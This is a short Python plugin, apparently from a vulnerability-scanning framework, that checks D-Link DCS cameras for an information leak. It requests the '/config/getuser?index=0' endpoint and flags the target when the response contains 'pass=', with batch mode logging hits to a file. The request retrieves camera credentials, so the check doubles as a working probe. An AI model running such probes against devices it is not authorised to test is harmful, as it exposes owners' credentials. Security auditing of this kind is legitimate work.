#! /usr/bin/python3
# -*- encoding: utf-8 -*-
import urllib3
import requests
from pub.com.outprint import OutPrintInfo,OutPrintInfoSuc
from pub.com.reqset import ReqSet
from pub.com.output import OutPutFile
urllib3.disable_warnings()


class DlinkInfoScan:

    def run(self, urls):
        url = urls + '/config/getuser?index=0'
        # print(head)
        try:
            response = requests.get(url, headers=self.headers,verify=self.ssl, timeout=5, proxies=self.proxy)
            if "pass=" in response.text:
                OutPrintInfoSuc("D-link DCS", f'存在D-link DCS敏感信息泄漏{url}')
                if self.batch:
                    OutPutFile("dlink_info.txt",f'存在D-link DCS敏感信息泄漏{url}')
            else:
                if not self.batch:
                    OutPrintInfo("D-link DCS", '不存在D-link DCS敏感信息泄漏')
        except Exception:
            if not self.batch:
                OutPrintInfo("D-link DCS", '目标请求出错')

    def main(self, target):
        self.batch = target["batch_work"]
        url = target["url"].strip('/ ')
        self.ssl = target["ssl"]
        header = target["header"]
        proxy = target["proxy"]
        self.headers, self.proxy = ReqSet(header=header, proxy=proxy, bwork=self.batch)
        if not self.batch:
            OutPrintInfo("D-link DCS", '开始执行D-link DCS敏感信息泄漏检测')
        self.run(url)
        if not self.batch:
            OutPrintInfo("D-link DCS", 'D-link DCS敏感信息泄漏执行结束')
